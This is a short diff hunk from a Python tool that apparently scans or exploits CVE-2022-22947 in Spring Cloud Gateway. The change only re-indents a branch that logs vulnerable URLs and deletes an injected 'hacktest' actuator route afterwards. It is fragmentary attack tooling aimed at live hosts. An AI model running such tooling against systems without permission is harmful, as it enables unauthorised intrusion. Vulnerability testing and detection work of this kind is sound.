@@ -141,10 +141,10 @@ def CVE_2022_22947(url, proxies):
                 f2 = open("vulout.txt", "a")
                 f2.write("[+] [CVE-2022-22947] " + url + '\n')
                 f2.close()
-                else:
-                    cprint("[-] 目标 " + url + " 验证CVE-2022-22947漏洞不存在", "yellow")
-                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=5 ,verify=False, proxies=proxies)
-                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=5 ,verify=False, proxies=proxies)
+            else:
+                cprint("[-] 目标 " + url + " 验证CVE-2022-22947漏洞不存在", "yellow")
+                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=5 ,verify=False, proxies=proxies)
+                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=5 ,verify=False, proxies=proxies)
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
